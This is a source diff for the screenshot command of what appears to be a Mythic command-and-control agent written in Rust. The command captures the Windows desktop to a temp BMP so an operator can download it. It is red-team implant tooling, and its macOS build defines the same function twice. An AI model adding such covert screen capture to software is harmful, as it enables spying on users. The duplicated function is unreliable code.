@@ -1,11 +1,11 @@
-use crate::{AgentTask, mythic_success};
+use serde::{Deserialize, Serialize};
 use std::error::Error;
 use std::result::Result;
-use serde_json;
-use hostname;
 
 #[cfg(target_os = "windows")]
-use std::{fs, ptr};
+use std::fs;
+#[cfg(target_os = "windows")]
+use std::ptr;
 #[cfg(target_os = "windows")]
 use winapi::shared::windef::{HBITMAP, HDC, HWND};
 #[cfg(target_os = "windows")]
@@ -15,38 +15,48 @@ use winapi::um::winuser::*;
 #[cfg(target_os = "windows")]
 use winapi::um::errhandlingapi::GetLastError;
 
+// Command structure for Mythic
+#[derive(Serialize, Deserialize)]
+pub struct ScreenshotArgs {}
+
+#[cfg(target_os = "windows")]
+#[derive(Serialize)]
+pub struct ScreenshotResult {
+    pub success: bool,
+    pub file_path: Option<String>,
+    pub output: String,
+    pub error: Option<String>,
+}
+
 /// Take a screenshot of the primary screen using WinAPI GDI functions
 #[cfg(target_os = "windows")]
-pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
+pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
     unsafe {
         let hwnd_desktop: HWND = GetDesktopWindow();
         let hdc_screen: HDC = GetDC(hwnd_desktop);
         if hdc_screen.is_null() {
-            return Err(format!("Failed to get screen DC. Error: {}", GetLastError()).into());
+            return Err(format!("Failed to get screen DC. Error: {}", GetLastError()));
         }
 
         let hdc_mem: HDC = CreateCompatibleDC(hdc_screen);
         if hdc_mem.is_null() {
             ReleaseDC(hwnd_desktop, hdc_screen);
-            return Err(format!("Failed to create memory DC. Error: {}", GetLastError()).into());
+            return Err(format!("Failed to create memory DC. Error: {}", GetLastError()));
         }
 
         // Get screen size - use primary monitor dimensions
         let width = GetSystemMetrics(SM_CXSCREEN);
         let height = GetSystemMetrics(SM_CYSCREEN);
         
-        eprintln!("DEBUG: Primary screen resolution: {}x{}", width, height);
-        
         // Also get virtual screen dimensions for comparison
         let virtual_width = GetSystemMetrics(SM_CXVIRTUALSCREEN);
         let virtual_height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
-        eprintln!("DEBUG: Virtual screen resolution: {}x{}", virtual_width, virtual_height);
 
         let hbitmap: HBITMAP = CreateCompatibleBitmap(hdc_screen, width, height);
         if hbitmap.is_null() {
             DeleteDC(hdc_mem);
             ReleaseDC(hwnd_desktop, hdc_screen);
-            return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()).into());
+            return Err(format!("Failed to create compatible bitmap. Error: {}", GetLastError()));
         }
 
         SelectObject(hdc_mem, hbitmap as *mut _);
@@ -54,7 +64,7 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
             DeleteObject(hbitmap as *mut _);
             DeleteDC(hdc_mem);
             ReleaseDC(hwnd_desktop, hdc_screen);
-            return Err(format!("BitBlt failed. Error: {}", GetLastError()).into());
+            return Err(format!("BitBlt failed. Error: {}", GetLastError()));
         }
 
         // Save screenshot to a file with timestamp
@@ -65,10 +75,8 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         let filename = format!("screenshot_{}.bmp", timestamp);
         let screenshot_path = std::env::temp_dir().join(&filename);
         
-        // Debug: Print the full path where screenshot will be saved
-        eprintln!("DEBUG: Screenshot will be saved to: {}", screenshot_path.to_string_lossy());
-        
-        save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)?;
+        save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path)
+            .map_err(|e| format!("Failed to save bitmap: {}", e))?;
 
         // Cleanup
         DeleteObject(hbitmap as *mut _);
@@ -76,26 +84,17 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
         ReleaseDC(hwnd_desktop, hdc_screen);
 
         // Read BMP bytes for size info
-        let screenshot_data = fs::read(&screenshot_path)?;
-
-        // Debug: Confirm file was saved and show details
-        eprintln!("DEBUG: Screenshot saved successfully!");
-        eprintln!("DEBUG: File path: {}", screenshot_path.to_string_lossy());
-        eprintln!("DEBUG: File size: {} bytes", screenshot_data.len());
-        eprintln!("DEBUG: File exists: {}", screenshot_path.exists());
+        let screenshot_data = fs::read(&screenshot_path)
+            .map_err(|e| format!("Failed to read screenshot file: {}", e))?;
 
         // Return success with file path for manual download
-        // The browser script expects a file_id, but we'll return the path for now
-        Ok(mythic_success!(
-            task.id,
-            format!(
-                "Screenshot captured successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Resolution: {}x{}\n- Exists: {}\n\nTo download to Mythic, use:\ndownload {}",
-                screenshot_path.to_string_lossy(),
-                screenshot_data.len(),
-                width, height,
-                screenshot_path.exists(),
-                screenshot_path.to_string_lossy()
-            )
+        Ok(format!(
+            "Screenshot captured successfully!\n\nFile Details:\n- Path: {}\n- Size: {} bytes\n- Resolution: {}x{}\n- Virtual Screen: {}x{}\n\nTo download to Mythic, use:\ndownload {}",
+            screenshot_path.to_string_lossy(),
+            screenshot_data.len(),
+            width, height,
+            virtual_width, virtual_height,
+            screenshot_path.to_string_lossy()
         ))
     }
 }
@@ -105,8 +104,6 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
 unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &std::path::Path) -> Result<(), Box<dyn Error>> {
     use std::fs::File;
     use std::io::Write;
-
-    eprintln!("DEBUG: Creating BMP file at: {}", path.to_string_lossy());
 
     let mut bmp_file_header = BITMAPFILEHEADER {
         bfType: 0x4D42, // 'BM'
@@ -137,9 +134,6 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
 
     bmp_file_header.bfSize = bmp_file_header.bfOffBits + image_size;
 
-    eprintln!("DEBUG: BMP dimensions: {}x{}", width, height);
-    eprintln!("DEBUG: BMP image size: {} bytes", image_size);
-
     let mut buffer = vec![0u8; image_size as usize];
     let hdc = GetDC(ptr::null_mut());
     GetDIBits(
@@ -163,7 +157,6 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
 
     // Write BMP to file manually without bytemuck
     let mut file = File::create(path)?;
-    eprintln!("DEBUG: BMP file created successfully");
     
     // Write BITMAPFILEHEADER
     file.write_all(&bmp_file_header.bfType.to_le_bytes())?;
@@ -188,13 +181,29 @@ unsafe fn save_bitmap_to_file(hbitmap: HBITMAP, width: u32, height: u32, path: &
     // Write pixel data
     file.write_all(&buffer)?;
     
-    eprintln!("DEBUG: BMP file written successfully, total size: {} bytes", 
-        bmp_file_header.bfOffBits + image_size);
-    
     Ok(())
 }
 
+// macOS placeholder implementation
+#[cfg(target_os = "macos")]
+pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
+    Err("screenshot command is not implemented for macOS".to_string())
+}
+
+// Fallback for other platforms
 #[cfg(not(target_os = "windows"))]
-pub fn take_screenshot(_task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
-    Err("Screenshot functionality is only supported on Windows".into())
+pub fn execute_screenshot(_args: ScreenshotArgs) -> Result<String, String> {
+    Err("screenshot command is only supported on Windows".to_string())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_screenshot_args_parsing() {
+        let args = ScreenshotArgs {};
+        // Just verify the struct can be created
+        assert!(true);
+    }
 }
